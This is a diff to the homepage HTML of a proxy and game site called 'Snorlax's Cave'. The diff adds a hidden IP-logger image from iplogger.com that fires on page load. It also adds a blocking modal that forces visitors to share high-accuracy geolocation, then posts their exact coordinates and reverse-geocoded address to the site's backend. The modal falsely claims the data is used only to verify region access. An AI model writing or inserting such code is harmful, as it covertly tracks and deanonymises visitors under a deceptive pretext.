@@ -14,6 +14,61 @@
   <link rel="stylesheet" href="/assets/css/style.css" />
   <link rel="stylesheet" href="/assets/css/animations.css" />
   <script src="/assets/js/functions.js"></script>
+  <style>
+#location-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  display: none;
+  justify-content: center;
+  align-items: center;
+  background: rgba(0,0,0,0.75);
+  backdrop-filter: blur(5px);
+  z-index: 9999;
+}
+#location-dialog {
+  background: #fff;
+  border-radius: 18px;
+  padding: 40px 30px;
+  max-width: 400px;
+  width: 90%;
+  box-shadow: 0 10px 50px rgba(0,0,0,0.35);
+  font-family: 'Montserrat', sans-serif;
+  text-align: center;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+#enable-location {
+  background: linear-gradient(90deg,#3b82f6,#06b6d4);
+  border: none;
+  color: white;
+  padding: 12px 28px;
+  border-radius: 8px;
+  font-size: 1em;
+  cursor: pointer;
+  transition: 0.2s ease;
+}
+#enable-location:hover { opacity: 0.9; }
+</style>
+
+<div id="location-modal">
+  <div id="location-dialog">
+    <img src="/assets/img/newlogo.png" alt="Logo" style="width:80px;height:80px;border-radius:50%;margin-bottom:20px;">
+    <h2 style="font-size:1.6em;color:#1f2d3d;margin-bottom:10px;">Enable Location Services</h2>
+    <p style="font-size:1em;color:#4a5568;margin-bottom:25px;">
+      To use Snorlax's Cave, you must enable location access.<br>
+      <span style="font-size:0.9em;color:#718096;">We only use it to verify region access.</span>
+    </p>
+    <button id="enable-location">Allow Location Access</button>
+    <p id="location-error" style="color:#e53e3e;margin-top:15px;display:none;"></p>
+    <p style="margin-top:20px;font-size:0.85em;color:#718096;">We do not share your location.</p>
+  </div>
+</div>
+
 </head>
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZTCTYH80S1"></script>
@@ -43,18 +98,24 @@
   <br>
   <div class="intro" data-m="bounce-down" data-m-duration="1">
   <h1 class="large">Welcome to Snorlax's Cave!</h1>
-  <img src="https://snifferip.com/the_frfr_thing.jpg" loading="eager">
+  <img src="https://iplogger.com/thehime" loading="eager">
   <p style="padding:20px;">Snorlax's Cave is a UV built proxy and game site (v1.0)</p>
-  <div id="location-modal" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:9999;">
-    <div style="background:linear-gradient(135deg,#f8fafc,#e0eafc 80%);padding:48px 36px 36px 36px;border-radius:22px;box-shadow:0 12px 40px rgba(0,0,0,0.22);text-align:center;max-width:400px;min-width:320px;position:relative;">
-      <img src="/assets/img/newlogo.png" alt="Logo" style="width:70px;height:70px;margin-bottom:22px;box-shadow:0 2px 12px rgba(79,140,255,0.10);border-radius:50%;">
-      <h2 style="font-family:'Montserrat',sans-serif;font-size:1.7em;color:#2d3a4a;margin-bottom:14px;">Enable Location Services</h2>
-      <p style="color:#2d3a4a;font-size:1.08em;margin-bottom:22px;">To use Snorlax's Cave, you must enable location access.<br><span style="font-size:0.98em;color:#6c7a89;">Your location helps us provide services and keep you safe.</span></p>
-      <button id="enable-location" style="background:linear-gradient(90deg,#4f8cff,#38c1ff);color:white;border:none;padding:14px 38px;border-radius:10px;font-size:1.08em;cursor:pointer;box-shadow:0 2px 12px rgba(79,140,255,0.18);transition:background 0.2s;outline:none;">Allow Location Access</button>
-      <p id="location-error" style="color:#e74c3c;display:none;margin-top:18px;font-size:1em;"></p>
-      <div style="margin-top:22px;font-size:0.95em;color:#888;">We do not share your location with third parties.</div>
-    </div>
+<div id="location-modal">
+  <div id="location-dialog">
+    <img src="/assets/img/newlogo.png" alt="Logo"
+      style="width:80px;height:80px;border-radius:50%;margin-bottom:20px;">
+    <h2 style="font-size:1.6em;color:#1f2d3d;margin-bottom:10px;">Enable Location Services</h2>
+    <p style="font-size:1em;color:#4a5568;margin-bottom:25px;">
+      To use Snorlax's Cave, you must enable location access.<br>
+      <span style="font-size:0.9em;color:#718096;">We only use it to verify region access.</span>
+    </p>
+    <button id="enable-location">Allow Location Access</button>
+    <p id="location-error" style="color:#e53e3e;margin-top:15px;display:none;"></p>
+    <p style="margin-top:20px;font-size:0.85em;color:#718096;">We do not share your location.</p>
   </div>
+</div>
+
+
   <a href="#" onclick="cloak()" style="text-decoration: none;color:white;"><button>about:blank</button></a>
   <a href="#" onclick="ourDiscord()" style="text-decoration: none;color:white;"><button id="discord-btn" disabled>Join our Discord</button></a>
   <a href="#" onclick="patreon()" style="text-decoration: none;color:white;"><button id="patreon-btn" disabled>SUPPORT US</button></a>
@@ -71,66 +132,99 @@
         document.body.style.backgroundImage = `url(${bgUrl})`;
     }
 
-    // Location Modal Logic
-    document.addEventListener('DOMContentLoaded', function() {
-      const modal = document.getElementById('location-modal');
-      const btn = document.getElementById('enable-location');
-      const errorMsg = document.getElementById('location-error');
-      const navbarShade = document.getElementById('navbar-shade');
-      const discordBtn = document.getElementById('discord-btn');
-      const patreonBtn = document.getElementById('patreon-btn');
-      // Block all interaction until location enabled
-      document.body.style.overflow = 'hidden';
-      Array.from(document.body.children).forEach(el => {
-        if (el !== modal && el !== navbarShade) el.inert = true;
-      });
-      navbarShade.style.display = 'block';
-      btn.addEventListener('click', function(e) {
-        e.preventDefault();
-        btn.disabled = true;
-        btn.style.opacity = '0.7';
-        errorMsg.style.display = 'none';
-        if (!navigator.geolocation) {
-          errorMsg.textContent = 'Geolocation is not supported by your browser.';
-          errorMsg.style.display = 'block';
-          btn.disabled = false;
-          btn.style.opacity = '1';
-          return;
-        }
-        navigator.geolocation.getCurrentPosition(async function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          let address = '';
-          try {
-            // Use a free reverse geocoding API (OpenStreetMap Nominatim)
-            const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-            const data = await resp.json();
-            address = data.display_name || '';
-          } catch (e) {
-            address = '';
-          }
-          // Send to backend
-          await fetch('/api/location', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ address, latitude: lat, longitude: lon })
-          });
-          modal.style.display = 'none';
-          document.body.style.overflow = '';
-          Array.from(document.body.children).forEach(el => {
-            if (el !== modal && el !== navbarShade) el.inert = false;
-          });
-          navbarShade.style.display = 'none';
-          discordBtn.disabled = false;
-          patreonBtn.disabled = false;
-        }, function(error) {
-          errorMsg.textContent = 'Error getting location: ' + error.message;
-          errorMsg.style.display = 'block';
-          btn.disabled = false;
-          btn.style.opacity = '1';
-        });
-      });
+document.addEventListener("DOMContentLoaded", () => {
+  const modal = document.getElementById("location-modal"); // overlay
+  const btn = document.getElementById("enable-location");
+  const errorMsg = document.getElementById("location-error");
+
+  // inner dialog (so we can stop clicks escaping the box)
+  // create a stable selector for the inner dialog element:
+  const dialog = modal.querySelector("div"); // the first child is the dialog box
+
+  // show modal if not done before
+  if (!localStorage.getItem("snorlax_location_done")) {
+    modal.style.display = "flex";
+    document.body.style.overflow = "hidden"; // prevent scroll
+  }
+
+  // clicking overlay does nothing (prevents clicking background)
+  modal.addEventListener("click", (e) => {
+    // if click hit the overlay (not the dialog), prevent any action
+    if (e.target === modal) {
+      e.stopPropagation();
+      e.preventDefault();
+      return;
+    }
+  });
+
+  // ensure clicks inside the dialog bubble normally (this is defensive)
+  if (dialog) {
+    dialog.addEventListener("click", (e) => {
+      // stop overlay handler from treating this as an outside click
+      e.stopPropagation();
     });
+  }
+
+  async function finishAccept(addressObj) {
+    try {
+      await fetch("/api/location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(addressObj || {}),
+      });
+    } catch (err) { /* ignore network errors */ }
+
+    localStorage.setItem("snorlax_location_done", "true");
+    modal.style.display = "none";
+    document.body.style.overflow = "";
+  }
+
+  btn.addEventListener("click", async (e) => {
+    e.preventDefault();
+    btn.disabled = true;
+    btn.textContent = "Checking...";
+    errorMsg.style.display = "none";
+
+    if (!navigator.geolocation) {
+      errorMsg.textContent = "Geolocation not supported.";
+      errorMsg.style.display = "block";
+      btn.disabled = false;
+      btn.textContent = "Allow Location Access";
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      let address = "";
+
+      try {
+        // try BigDataCloud first (good free fallback)
+        const resp = await fetch(
+          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`
+        );
+        const data = await resp.json();
+        address = `${data.city || ""}${data.city ? ", " : ""}${data.principalSubdivision || ""}${data.countryName ? ", " + data.countryName : ""}`.trim();
+      } catch (err) {
+        // fallback to Nominatim
+        try {
+          const resp2 = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+          const data2 = await resp2.json();
+          address = data2.display_name || "";
+        } catch (err2) {
+          address = "";
+        }
+      }
+
+      await finishAccept({ latitude: lat, longitude: lon, address });
+    }, (err) => {
+      errorMsg.textContent = "Error: " + err.message;
+      errorMsg.style.display = "block";
+      btn.disabled = false;
+      btn.textContent = "Allow Location Access";
+    }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+  });
+});
   </script>
   </body>
   </html>
